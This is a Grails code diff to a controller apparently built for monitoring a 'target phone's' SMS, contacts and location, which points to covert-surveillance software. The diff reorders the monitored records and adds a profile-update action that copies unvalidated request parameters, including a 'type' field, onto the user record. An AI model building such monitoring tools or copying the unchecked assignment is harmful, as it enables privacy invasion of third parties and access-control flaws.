@@ -11,11 +11,13 @@ import com.xaviar.domain.Location
 import com.xaviar.domain.Sms
 import com.xaviar.domain.TargetPhone
 import com.xaviar.domain.User
+import com.xaviar.service.UserService;
 
 class SpyBoyController {
 
 	def sessionFactory;
 	def dataSource;
+	def userService;
 
 	def index() {
 	}
@@ -128,7 +130,7 @@ class SpyBoyController {
 							eq("simSubscriberId", currentTargetPhone.simSubscriberId)
 						}
 					}
-					order("time","asc")
+					order("time","desc")
 				}
 
 				def contactCriteria = Contact.createCriteria()
@@ -393,6 +395,32 @@ class SpyBoyController {
 		def username  = SecurityUtils.subject?.principal
 		User currentUser = User.findByUsername(username);
 		[user:currentUser]
+	}
+
+	def updateUserDetails(){
+		try{
+			def username  = SecurityUtils.subject?.principal
+			User currentUser = User.findByUsername(username);
+
+			currentUser.firstName= params.firstName;
+			currentUser.lastName= params.lastName;
+			currentUser.birthDate= new Date(params.birthDate);
+			currentUser.occupation= params.occupation;
+			currentUser.email= params.email;
+			currentUser.number= params.number;
+			currentUser.type= params.type;
+			currentUser.country= params.country;
+			currentUser.more= params.more;
+			currentUser.siteURL= params.siteURL;
+			currentUser.address= params.address;
+
+			userService.updateUserDetails(currentUser);
+			flash.message = "הנתונים נשמרו בהצלחה.";
+			[error:false]
+		}catch(Exception e){
+			flash.message = "הנתונים לא נשמרו.";
+			[error:true]
+		}
 	}
 
 	def layout_blank_page(){
